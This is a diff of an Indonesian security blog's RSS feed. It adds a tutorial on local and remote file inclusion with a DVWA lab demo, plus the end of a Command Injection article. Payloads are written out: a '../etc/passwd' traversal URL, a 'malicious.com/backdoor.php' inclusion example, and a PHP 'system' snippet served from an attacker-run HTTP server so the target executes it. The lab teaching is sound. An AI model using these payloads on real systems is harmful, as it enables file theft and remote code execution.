+&lt;li&gt;Terapkan WAF untuk mendeteksi dan memblokir pola serangan yang mencurigakan.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Audit dan Monitoring:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Pantau log server untuk mendeteksi aktivitas tidak biasa.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Dengan memahami cara kerja Command Injection dan menerapkan langkah mitigasi yang tepat, Anda dapat melindungi aplikasi Anda dari serangan ini secara efektif.&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
+      <title>Memahami File Inclusion</title>
+      <link>https://nancynesia.com/docs/hacking/hacking_fundamentals/memahami-file-inclusion/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://nancynesia.com/docs/hacking/hacking_fundamentals/memahami-file-inclusion/</guid>
+      <description>
+        
+        
+        &lt;h2&gt;Apa itu File Inclusion?&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;apa-itu-file-inclusion&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#apa-itu-file-inclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;File Inclusion adalah kerentanan yang terjadi ketika aplikasi web tidak memvalidasi input dengan benar yang digunakan untuk mengakses file di server. Kerentanan ini memungkinkan hacker mengakses file yang seharusnya tidak terdaftar pada aplikasi.&lt;/p&gt;
+&lt;h3&gt;Kategori File Inclusion&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;kategori-file-inclusion&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#kategori-file-inclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Local File Inclusion (LFI)&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Hacker dapat membaca file yang tidak diinginkan dengan cara menyisipkan perintah inklusi file lokal pada input aplikasi web.&lt;/li&gt;
+&lt;li&gt;Terjadi pada aplikasi yang mengizinkan user mengunggah file tanpa validasi upload yang memadai.&lt;/li&gt;
+&lt;li&gt;Contoh: hacker menyisipkan path lokal seperti &lt;code&gt;../../etc/passwd&lt;/code&gt; untuk membaca file konfigurasi sensitif.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Remote File Inclusion (RFI)&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Hacker dapat menyisipkan file yang dihosting di luar sistem untuk diakses oleh aplikasi web.&lt;/li&gt;
+&lt;li&gt;Terjadi ketika aplikasi menerima input tanpa validasi yang memadai, memungkinkan file remote diakses dan dijalankan di server.&lt;/li&gt;
+&lt;li&gt;Contoh: hacker menyisipkan URL eksternal seperti &lt;code&gt;http://malicious.com/backdoor.php&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;Dampak&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;dampak&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#dampak&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Membaca file sensitif seperti &lt;code&gt;passwd&lt;/code&gt; pada sistem operasi.&lt;/li&gt;
+&lt;li&gt;Menjalankan file berbahaya yang diunggah oleh hacker.&lt;/li&gt;
+&lt;li&gt;Memberikan akses tak terbatas ke sistem file server.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Pencegahan&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pencegahan&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pencegahan&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Lakukan sanitasi dan validasi data input dengan ketat.&lt;/li&gt;
+&lt;li&gt;Hindari penggunaan fungsi yang rentan seperti &lt;code&gt;include&lt;/code&gt;, &lt;code&gt;require&lt;/code&gt;, &lt;code&gt;include_once&lt;/code&gt;, dan &lt;code&gt;require_once&lt;/code&gt; dengan input dinamis.&lt;/li&gt;
+&lt;li&gt;Gunakan whitelist file yang diizinkan untuk diakses.&lt;/li&gt;
+&lt;li&gt;Konfigurasikan server untuk membatasi akses file dan direktori tertentu.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Demo File Inclusion di DVWA&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;demo-file-inclusion-di-dvwa&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#demo-file-inclusion-di-dvwa&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h3&gt;Persiapan&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;persiapan&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#persiapan&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;Pastikan level keamanan DVWA disetel ke &lt;strong&gt;Low&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;Pergi ke menu &lt;strong&gt;File Inclusion&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;Eksperimen Local File Inclusion (LFI)&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;eksperimen-local-file-inclusion-lfi&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#eksperimen-local-file-inclusion-lfi&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;DVWA memiliki beberapa file seperti &lt;code&gt;file1.php&lt;/code&gt;, &lt;code&gt;file2.php&lt;/code&gt;, dan &lt;code&gt;file3.php&lt;/code&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;file1.php&lt;/strong&gt;: Berisi Username dan IP.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;file2.php&lt;/strong&gt;: Berisi catatan dari aplikasi.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;file3.php&lt;/strong&gt;: Informasi tentang sistem (localhost).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Akses file &lt;code&gt;file1.php&lt;/code&gt; melalui URL dan coba eksplorasi direktori root:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;pre&gt;&lt;code&gt;localhost:4280/vulnerabilities/fi/?page=.../../../../../etc/passwd&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Isi file &lt;code&gt;/etc/passwd&lt;/code&gt; akan ditampilkan, menunjukkan bahwa server rentan terhadap LFI.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;Eksperimen Remote File Inclusion (RFI)&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;eksperimen-remote-file-inclusion-rfi&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#eksperimen-remote-file-inclusion-rfi&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Gunakan URL berikut untuk mencoba menyisipkan file dari sumber eksternal:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;pre&gt;&lt;code&gt;localhost:4280/vulnerabilities/fi/?page=https://google.com&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;https://nancynesia.com/images/RFI1.png&#34; alt=&#34;RFI 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Untuk simulasi RFI, buat file PHP berisi kode berikut, simpan sebagai &lt;code&gt;rfi.php&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ls&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Jalankan server HTTP lokal untuk menghosting file &lt;code&gt;rfi.php&lt;/code&gt;. Misalnya, jika IP lokal adalah &lt;code&gt;192.168.8.120&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m http.server &lt;span style=&#34;color:#ae81ff&#34;&gt;8000&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Gunakan URL berikut untuk menyisipkan file remote:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;pre&gt;&lt;code&gt;localhost:4280/vulnerabilities/fi/?page=http://192.168.8.120:8000/rfi.php&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Server akan menjalankan perintah &lt;code&gt;ls&lt;/code&gt; dan menampilkan hasilnya.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://nancynesia.com/images/RFI2.png&#34; alt=&#34;RFI 2&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;Catatan Tambahan&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;catatan-tambahan&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#catatan-tambahan&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Pastikan DVWA berjalan di lingkungan yang aman (sandbox) saat melakukan eksperimen ini.&lt;/li&gt;
+&lt;li&gt;Jangan gunakan teknik ini di sistem produksi atau tanpa izin.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;Kesimpulan&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;kesimpulan&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#kesimpulan&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Dengan memahami mekanisme LFI dan RFI, kita dapat mengenali potensi risiko keamanan yang dihadapi aplikasi web dan mengambil langkah-langkah mitigasi yang tepat untuk mencegah eksploitasi serupa.&lt;/p&gt;
+
+      </description>
+    </item>
+    
+    <item>
       <title>Metodologi Penetesting</title>
       <link>https://nancynesia.com/docs/hacking/hacking_fundamentals/metodologi-pentesting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
